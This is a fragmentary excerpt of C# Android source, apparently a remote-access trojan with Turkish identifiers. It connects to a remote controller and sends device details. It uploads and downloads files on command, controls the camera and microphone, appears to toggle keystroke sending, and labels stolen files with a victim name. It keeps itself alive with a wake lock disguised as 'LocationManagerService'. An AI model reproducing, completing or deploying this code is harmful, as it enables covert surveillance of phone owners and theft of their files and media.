...
namespace Task2
{
    ...
    */
    ...
    public class MainActivity : Activity
    {
        ...
        {
            //RunOnUiThread(() => { Toast.MakeText(this, "TRY TO CONNECTING", ToastLength.Long).Show(); });
            await Task.Run(() =>
            {
                try
                {
                    if (Soketimiz != null) { Soketimiz.Close(); Soketimiz.Dispose(); }
                    ...
                    SetKeepAlive(Soketimiz, 300000, 1000);
                    ...
                    + "[VERI]" + DeviceInfo.Manufacturer + "/" + DeviceInfo.Model + "[VERI]" + DeviceInfo.Version + "/" + ((int)Build.VERSION.SdkInt).ToString() + "[VERI]" + wallpaper());
        ...
        public class infoAl : IDisposable
        {
            ...
            byte[] dataByte = new byte[131072];
            int blockSize = 131072; //128KB
            Socket tmp = default;
            MainActivity tmp_form = default;
            ...
            public async void endRead(IAsyncResult ar)
            {
                ...
                {
                    if (((MainActivity)global_activity).fileUpStream != null)
                    {
                        ((MainActivity)global_activity).fileUpStream.Flush();
                        ((MainActivity)global_activity).fileUpStream.Close();
                        ((MainActivity)global_activity).fileUpStream.Dispose();
                        ((MainActivity)global_activity).fileUpStream = new MemoryStream();
                    }
                    Prev.global_cam.StopCamera(); key_gonder = false;
                    tmp_form.micStop();
        ...
        public void ifDoze()
        {
            if (Build.VERSION.SdkInt >= BuildVersionCodes.M)
            {
                ...
                RegisterReceiver(new DozeReceiver(), new IntentFilter(PowerManager.ActionDeviceIdleModeChanged));
            }
        }
        ...
        public void kameraCozunurlukleri()
        {
            ...
            {
                byte[] data = MyDataPacker("OLCULER", System.Text.Encoding.UTF8.GetBytes("Kameraya erişilemiyor."));
                Soketimiz.BeginSend(data, 0, data.Length, SocketFlags.None, null, null);
            }
        }
        ...
        protected override void OnCreate(Bundle savedInstanceState)
        {
            ...
            wk = pm.NewWakeLock(WakeLockFlags.Partial, "LocationManagerService");
            wk.Acquire();
            /*
        ...
        public static PowerManager pm = default;
        public static PowerManager.WakeLock wk = default;
        /*
        public async void vib()
        {
        ...
        */
        public byte[] format(string tag, byte[] message)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                ms.Write(System.Text.Encoding.UTF8.GetBytes("PREFIX"), 0, System.Text.Encoding.UTF8.GetBytes("PREFIX").Length);
                ms.Write(System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}>"), 0, System.Text.Encoding.UTF8.GetBytes($"<{tag}>|{message.Length}>").Length);
        ...
        public async void DosyaGonder(string ayir)
        {
            try
            {
                ...
                using (MemoryStream from = new MemoryStream(dosya))
                {
                    ...
                    {
                        if (MainValues.stop_upload == true || Soketimiz.Connected == false) { break; }
                        ms.Write(buffer, 0, readCount);

                        byte[] pack = MyDataPacker("UZUNLUK", ms.ToArray(), $"{dosya.Length}[NAME][VERI]" + ayir.Substring(ayir.LastIndexOf("/") + 1) + "[VERI]" + MainValues.KRBN_ISMI + "_" + GetIdentifier());
        ...
        MemoryStream fileUpStream = new MemoryStream();
        ...
        private void Soketimizdan_Gelen_Veriler(string tag, byte[] dataBuff)
        {
            RunOnUiThread(() =>
            {
                try
                {
                    ...
                    {
                        case "<FILEDOWNSTOP>":
                            MainValues.stop_upload = true;
                            if (fileUpStream != null) { fileUpStream.Flush(); fileUpStream.Close(); fileUpStream.Dispose(); }
                            break;
                        case "<WEBCAMSTOP>":
                            MainValues.stop_cam = true;
                            break;
                        case "<DOWNFILE>":
                        ...
                        case "<DOSYABYTE>":
                            try
                            {
                                fileUpStream.Write(dataBuff, 0, dataBuff.Length);
                                if (fileUpStream.ToArray().Length == int.Parse(tag.Split('|')[2].Split(new string[] { "[NAME]" }, StringSplitOptions.None)[0]))
                                {
                                    string fName = tag.Split('|')[2].Split(new string[] { "[NAME]" }, StringSplitOptions.None)[1].
                                    Split(new string[] { "[VERI]" }, StringSplitOptions.None)[0];

                                    string pth = tag.Split('|')[2].Split(new string[] { "[NAME]" }, StringSplitOptions.None)[1].
                                    Split(new string[] { "[VERI]" }, StringSplitOptions.None)[1].Replace(">", "");

                                    File.WriteAllBytes(pth + "/" + fName, fileUpStream.ToArray());

                                    fileUpStream.Flush(); fileUpStream.Close(); fileUpStream.Dispose();
                                    try
                                    {
                                        byte[] dataPacker = MyDataPacker("DOSYAALINDI", System.Text.Encoding.UTF8.GetBytes(MainValues.KRBN_ISMI));
                                        Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                                    }
                                    catch (Exception) { }
                                }
                        ...
                        case "<SHORTCUT>":
                            ...
                            AddShortcut(shrt[1], shrt[2], dataBuff);
                            break;
